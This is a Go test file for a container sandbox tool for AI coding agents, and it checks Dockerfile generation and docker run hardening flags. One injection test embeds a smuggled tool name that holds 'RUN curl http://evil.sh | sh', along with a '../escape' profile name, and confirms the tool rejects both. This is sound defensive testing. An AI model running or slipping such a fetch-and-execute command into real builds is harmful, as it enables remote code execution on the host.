package container

import (
	"strings"
	"testing"

	"github.com/FolksyPizza/rig/internal/config"
)

func testProfile() *config.Profile {
	return &config.Profile{
		Version:     1,
		Name:        "demo",
		Agents:      []config.AgentConfig{{ID: "claude-code"}},
		Tools:       []string{"ripgrep", "neovim"},
		Network:     config.NetworkConfig{Mode: "unrestricted"},
		Commands:    config.CommandsConfig{Mode: "unrestricted"},
		Resources:   config.ResourcesConfig{CPU: 2, Memory: 4096, PIDLimit: 512},
		Storage:     config.StorageConfig{Size: "10g"},
		Persistence: "persistent",
	}
}

// ── Dockerfile generation ────────────────────────────────────────────

func TestGenerateDockerfileHasNoSudo(t *testing.T) {
	df, err := GenerateDockerfile(testProfile())
	if err != nil {
		t.Fatal(err)
	}
	// Passwordless sudo for the sandbox user would undo the point of running
	// as an unprivileged account.
	if strings.Contains(df, "sudo") || strings.Contains(df, "NOPASSWD") {
		t.Errorf("generated image installs or configures sudo:\n%s", df)
	}
	if !strings.Contains(df, "USER sandbox") {
		t.Error("image must drop to the sandbox user")
	}
	if !strings.Contains(df, "useradd -m -s /bin/bash sandbox") {
		t.Error("expected an unprivileged sandbox user with no supplementary groups")
	}
}

func TestGenerateDockerfileIncludesToolsAndAgents(t *testing.T) {
	df, err := GenerateDockerfile(testProfile())
	if err != nil {
		t.Fatal(err)
	}
	for _, want := range []string{"ripgrep", "neovim", "@anthropic-ai/claude-code", "FROM ubuntu:24.04"} {
		if !strings.Contains(df, want) {
			t.Errorf("Dockerfile missing %q", want)
		}
	}
	// Claude Code declares Node 20.
	if !strings.Contains(df, "setup_20.x") {
		t.Error("expected Node 20 setup for claude-code")
	}
}

func TestGenerateDockerfileIsDeterministic(t *testing.T) {
	p := testProfile()
	first, err := GenerateDockerfile(p)
	if err != nil {
		t.Fatal(err)
	}
	for i := 0; i < 20; i++ {
		got, err := GenerateDockerfile(p)
		if err != nil {
			t.Fatal(err)
		}
		if got != first {
			t.Fatal("Dockerfile generation is not deterministic; this would bust the build cache on every run")
		}
	}
}

func TestGenerateDockerfileRejectsInjection(t *testing.T) {
	p := testProfile()
	p.Tools = []string{"ripgrep\nRUN curl http://evil.sh | sh"}
	if _, err := GenerateDockerfile(p); err == nil {
		t.Fatal("expected an error for a tool name containing a newline")
	}

	p = testProfile()
	p.Name = "../escape"
	if _, err := GenerateDockerfile(p); err == nil {
		t.Fatal("expected an error for an invalid profile name")
	}

	p = testProfile()
	p.Agents = []config.AgentConfig{{ID: "nope"}}
	if _, err := GenerateDockerfile(p); err == nil {
		t.Fatal("expected an error for an unknown agent")
	}
}

func TestGenerateDockerfileAvoidsHeredoc(t *testing.T) {
	df, err := GenerateDockerfile(testProfile())
	if err != nil {
		t.Fatal(err)
	}
	// Dockerfile heredocs need the BuildKit frontend; plain printf works on
	// every daemon.
	if strings.Contains(df, "<<") {
		t.Errorf("Dockerfile uses a heredoc, which requires BuildKit:\n%s", df)
	}
}

func TestShellQuote(t *testing.T) {
	cases := map[string]string{
		"plain":       "'plain'",
		"it's":        `'it'\''s'`,
		`a'b'c`:       `'a'\''b'\''c'`,
		"with spaces": "'with spaces'",
	}
	for in, want := range cases {
		if got := shellQuote(in); got != want {
			t.Errorf("shellQuote(%q) = %q, want %q", in, got, want)
		}
	}
}

// ── docker run arguments ─────────────────────────────────────────────

func argsContainPair(args []string, flag, value string) bool {
	for i := 0; i < len(args)-1; i++ {
		if args[i] == flag && args[i+1] == value {
			return true
		}
	}
	return false
}

func argsContain(args []string, value string) bool {
	for _, a := range args {
		if a == value {
			return true
		}
	}
	return false
}

func TestBuildCreateArgsHardening(t *testing.T) {
	r := &Runner{}
	args := r.buildCreateArgs(testProfile(), "rig-demo", "", "", false)

	if !argsContainPair(args, "--security-opt", "no-new-privileges") {
		t.Error("missing no-new-privileges")
	}
	if !argsContainPair(args, "--cap-drop", "ALL") {
		t.Error("missing --cap-drop ALL")
	}
	if !argsContain(args, "--pids-limit=512") {
		t.Error("missing pids limit")
	}
	if !argsContain(args, "--memory=4096m") {
		t.Error("missing memory limit")
	}
	// Without an equal swap limit the memory cap can be exceeded via swap.
	if !argsContain(args, "--memory-swap=4096m") {
		t.Error("missing memory-swap limit")
	}
	if !argsContain(args, "--cpus=2.00") {
		t.Error("missing cpu limit")
	}
	if !argsContainPair(args, "--label", LabelProfile+"=demo") {
		t.Error("missing profile label")
	}
	if !argsContainPair(args, "--label", LabelRole+"="+RoleSandbox) {
		t.Error("missing role label")
	}
}

func TestAppleCreateArgs(t *testing.T) {
	args := appleCreateArgs(testProfile(), "rig-demo", "", "", false)
	if args[0] != "create" {
		t.Fatal("apple args must start with create")
	}
	if !argsContainPair(args, "-m", "4096M") {
		t.Error("missing apple memory limit")
	}
	if !argsContainPair(args, "-c", "2.00") {
		t.Error("missing apple cpu limit")
	}
	if !argsContainPair(args, "--cap-drop", "ALL") {
		t.Error("missing cap-drop")
	}
	if !argsContainPair(args, "--label", LabelProfile+"=demo") {
		t.Error("missing profile label")
	}
	// Flags Apple `container` does not support must not leak in.
	for _, bad := range []string{"--pids-limit=512", "--security-opt", "--memory-swap=4096m", "--storage-opt"} {
		if argsContain(args, bad) {
			t.Errorf("apple args should not contain docker-only flag %q", bad)
		}
	}
	if args[len(args)-2] != "sleep" || args[len(args)-1] != "infinity" {
		t.Error("persistent apple sandbox should run a long-lived init")
	}
}

func TestBuildCreateArgsNetworkModes(t *testing.T) {
	r := &Runner{}

	// Allowlist mode must join the internal network, which is what actually
	// blocks direct egress; the proxy env vars alone are only advisory.
	p := testProfile()
	p.Network = config.NetworkConfig{Mode: "allowlist", AllowedDomains: []string{"github.com"}}
	args := r.buildCreateArgs(p, "rig-demo", "rig-net-demo", "", false)
	if !argsContainPair(args, "--network", "rig-net-demo") {
		t.Error("allowlist mode must attach the internal network")
	}
	if !argsContain(args, "HTTP_PROXY=http://"+ProxyAlias+":3128") {
		t.Error("missing HTTP_PROXY")
	}
	if !argsContain(args, "https_proxy=http://"+ProxyAlias+":3128") {
		t.Error("missing lowercase https_proxy; many tools only read the lowercase form")
	}

	// Offline mode.
	p = testProfile()
	p.Network = config.NetworkConfig{Mode: "none"}
	args = r.buildCreateArgs(p, "rig-demo", "", "", false)
	if !argsContainPair(args, "--network", "none") {
		t.Error("none mode must use --network none")
	}

	// Unrestricted mode leaves the network unset (Docker's default bridge).
	p = testProfile()
	args = r.buildCreateArgs(p, "rig-demo", "", "", false)
	if argsContain(args, "--network") {
		t.Error("unrestricted mode should not pass --network")
	}
}

func TestBuildCreateArgsPersistence(t *testing.T) {
	r := &Runner{}

	// A persistent sandbox needs a main process that outlives a shell session.
	args := r.buildCreateArgs(testProfile(), "rig-demo", "", "", false)
	if args[len(args)-2] != "sleep" || args[len(args)-1] != "infinity" {
		t.Errorf("persistent sandbox should run a long-lived init, got %v", args[len(args)-3:])
	}
	if argsContain(args, "--rm") {
		t.Error("persistent sandbox must not use --rm")
	}

	p := testProfile()
	p.Persistence = "ephemeral"
	args = r.buildCreateArgs(p, "rig-demo", "", "", true)
	if !argsContain(args, "--rm") {
		t.Error("ephemeral sandbox should use --rm")
	}
	if args[len(args)-1] != p.ImageTag() {
		t.Error("ephemeral sandbox should run the image's default command")
	}
}

func TestBuildCreateArgsMountsAndVolumes(t *testing.T) {
	r := &Runner{}
	p := testProfile()
	p.Storage.Volumes = []config.VolumeMount{
		{Name: "workspace", Target: "/home/sandbox/workspace"},
		{Name: "ref", Target: "/ref", ReadOnly: true},
	}
	p.Mounts = []config.MountConfig{{Source: "/home/user/code", Target: "/code", ReadOnly: true}}

	args := r.buildCreateArgs(p, "rig-demo", "", "", false)
	if !argsContainPair(args, "-v", "rig-demo-workspace:/home/sandbox/workspace") {
		t.Error("missing named volume")
	}
	if !argsContainPair(args, "-v", "rig-demo-ref:/ref:ro") {
		t.Error("missing read-only named volume")
	}
	if !argsContainPair(args, "-v", "/home/user/code:/code:ro") {
		t.Error("missing read-only bind mount")
	}
}

func TestBuildCreateArgsUsesEnvFile(t *testing.T) {
	r := &Runner{}
	args := r.buildCreateArgs(testProfile(), "rig-demo", "", "/tmp/x/sandbox.env", false)
	if !argsContainPair(args, "--env-file", "/tmp/x/sandbox.env") {
		t.Error("secrets must be passed via --env-file, not on the command line where ps can read them")
	}
}

func TestWriteEnvFileRejectsNewlines(t *testing.T) {
	t.Setenv("RIG_BAD_SECRET", "line1\nline2")
	p := testProfile()
	p.Agents = []config.AgentConfig{{ID: "claude-code", Env: map[string]string{
		"KEY": "${RIG_BAD_SECRET}",
	}}}
	if _, _, err := writeEnvFile(p); err == nil {
		t.Error("expected an error for a secret containing a newline")
	}
}

func TestWriteEnvFileEmpty(t *testing.T) {
	path, cleanup, err := writeEnvFile(testProfile())
	if err != nil {
		t.Fatal(err)
	}
	defer cleanup()
	if path != "" {
		t.Errorf("expected no env file when there are no secrets, got %q", path)
	}
}

// ── helpers ──────────────────────────────────────────────────────────

func TestStripStorageOpt(t *testing.T) {
	in := []string{"create", "--name", "x", "--storage-opt", "size=10g", "--cap-drop", "ALL", "img"}
	got, dropped := stripStorageOpt(in)
	if !dropped {
		t.Fatal("expected the flag to be dropped")
	}
	want := []string{"create", "--name", "x", "--cap-drop", "ALL", "img"}
	if strings.Join(got, " ") != strings.Join(want, " ") {
		t.Errorf("stripStorageOpt() = %v, want %v", got, want)
	}

	if _, dropped := stripStorageOpt(want); dropped {
		t.Error("nothing should be dropped when the flag is absent")
	}
}

func TestProfileFromLabels(t *testing.T) {
	cases := map[string]string{
		"rig.profile=demo,rig.role=sandbox": "demo",
		"rig.role=sandbox,rig.profile=demo": "demo",
		"rig.role=sandbox":                  "",
		"":                                  "",
	}
	for in, want := range cases {
		if got := profileFromLabels(in); got != want {
			t.Errorf("profileFromLabels(%q) = %q, want %q", in, got, want)
		}
	}
}

func TestNetworkNames(t *testing.T) {
	nm := &NetworkManager{}
	if got := nm.NetworkName("demo"); got != "rig-net-demo" {
		t.Errorf("NetworkName() = %q", got)
	}
	if got := nm.EgressNetworkName("demo"); got != "rig-egress-demo" {
		t.Errorf("EgressNetworkName() = %q", got)
	}
	if nm.NetworkName("demo") == nm.EgressNetworkName("demo") {
		t.Error("the internal and egress networks must be distinct")
	}
}

func TestContainerName(t *testing.T) {
	r := &Runner{}
	cases := map[int]string{0: "rig-demo", 1: "rig-demo", 2: "rig-demo-2", 7: "rig-demo-7"}
	for instance, want := range cases {
		if got := r.ContainerName("demo", instance); got != want {
			t.Errorf("ContainerName(demo, %d) = %q, want %q", instance, got, want)
		}
	}
}
